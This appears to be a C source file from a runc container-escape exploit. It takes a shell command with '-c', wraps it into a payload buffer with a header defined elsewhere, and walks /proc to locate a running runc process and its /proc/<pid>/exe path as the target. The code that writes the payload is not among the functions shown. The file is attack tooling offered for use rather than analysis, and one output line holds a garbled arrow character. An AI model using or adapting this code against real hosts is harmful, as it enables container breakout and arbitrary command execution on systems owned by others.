#include "../lib/exploit.h"

char payload[MAX_PAYLOAD];
int debug_mode = 0;

void print_usage() {
    puts("Usage: ./exploit -c \"COMMAND\"\n"
                 "  -c <COMMAND>   Execute shell command\n"
                 "  -d             Enable debug outputs\n"
                 "  -h             Show this help message");
}

int parse_args(int argc, char* argv[], char** out_cmd, int* out_len) {
    for(int i = 1; i < argc; i++) {
        if(strcmp(argv[i], "-h") == 0) {
            print_usage();
            return EXIT_FAILURE;
        }

        if(strcmp(argv[i], "-d") == 0) {
            debug_mode = 1;
            continue;
        }

        if(strcmp(argv[i], "-c") == 0) {
            if (i + 1 < argc) {
                *out_cmd = argv[i + 1];
                *out_len = strlen(argv[i + 1]);
                return EXIT_SUCCESS;
            } else {
                fprintf(stderr, "Error: -c requires an argument\n");
                return EXIT_FAILURE;
            }
        }
    }

    return EXIT_SUCCESS;
}

size_t setup_payload(char* cmd, int cmd_len) {
    if(cmd != NULL && cmd_len > 0) {
        // check buffer sizes
        size_t header_len = strlen(PAYLOAD_HEADER);
        size_t total_len = header_len + cmd_len + 2; // +2 for \n + \0
        if(total_len >= MAX_PAYLOAD) {
            fprintf(stderr, "Error: Command too long for payload buffer.\n");
            return EXIT_FAILURE;
        }
        // copy header 
        memcpy(payload, PAYLOAD_HEADER, header_len);
        // copy command str
        memcpy(payload + header_len, cmd, cmd_len);
        // concat \n and \0
        payload[header_len + cmd_len] = '\n';
        payload[header_len + cmd_len + 1] = '\0';

        return total_len;
    } else {
        // use default payload
        strcpy(payload, PAYLOAD);
        return sizeof(PAYLOAD);
    }
}


runc_info_t find_runc_info() {
    runc_info_t result = { .pid = -1 };

    DIR *proc_dir = opendir("/proc");
    if(!proc_dir) {
        perror("[-] Cannot open /proc");
        return result;
    }

    struct dirent *entry;
    while((entry = readdir(proc_dir)) != NULL) {
        if(entry->d_type != DT_DIR || !is_pid_dir(entry->d_name))
            continue;

        int pid = atoi(entry->d_name);

    // parse cmdline
    char cmdline_path[PATH_MAX];
    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);

    char cmdline[PATH_MAX] = "(unreadable)";
    FILE *fp = fopen(cmdline_path, "r");
    if(fp) {
        size_t len = fread(cmdline, 1, sizeof(cmdline) - 1, fp);
        fclose(fp);

        if(len > 0) {
            for (size_t i = 0; i < len; i++) {
                if (cmdline[i] == '\0') cmdline[i] = ' ';
            }
            cmdline[len] = '\0';
        } else {
            strcpy(cmdline, "(empty)");
        }
    } else {
        // fallback: try /proc/<pid>/comm
        char comm_path[PATH_MAX];
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        FILE *comm_fp = fopen(comm_path, "r");
        if(comm_fp) {
            if (fgets(cmdline, sizeof(cmdline), comm_fp)) {
                cmdline[strcspn(cmdline, "\n")] = '\0'; // trim newline
            } else {
                strcpy(cmdline, "(unreadable)");
            }
            fclose(comm_fp);
        }
    }

        // parse namespace
        char ns_path[PATH_MAX];
        snprintf(ns_path, sizeof(ns_path), "/proc/%d/ns/pid", pid);
        struct stat ns_stat;
        unsigned long ns_inode = 0;
        if(stat(ns_path, &ns_stat) == 0) {
            ns_inode = (unsigned long)ns_stat.st_ino;
        }

        // parse exe symlink
        char exe_path[PATH_MAX];
        char exe_target[PATH_MAX] = "(unreadable)";
        snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
        ssize_t len = readlink(exe_path, exe_target, sizeof(exe_target) - 1);
        if(len != -1) exe_target[len] = '\0';

        // check for runc
        int is_runc = (strstr(cmdline, "runc") != NULL || strstr(exe_target, "runc") != NULL);
        int exe_resolved = (len != -1);

        if(debug_mode || (is_runc && exe_resolved)) {
            char *clean_name = strrchr(cmdline, '/');
            clean_name = clean_name ? clean_name + 1 : cmdline;
            if (strlen(clean_name) == 0) clean_name = "(empty)";

            printf("[ALL] PID %-5d â†’ %-18s | NS: %-12lu | Raw cmdline: %s | exe: %s\n",
                pid, clean_name, ns_inode, cmdline, exe_target);
        }

        if (is_runc && exe_resolved) {
            result.pid = pid;
            snprintf(result.exe_path, sizeof(result.exe_path), "%s", exe_path);
        }
    }

    closedir(proc_dir);
    return result;
}

int is_pid_dir(const char *name) {
    for (int i = 0; name[i] != '\0'; i++) {
        if (!isdigit((unsigned char)name[i]))
            return 0;
    }
    return 1;
}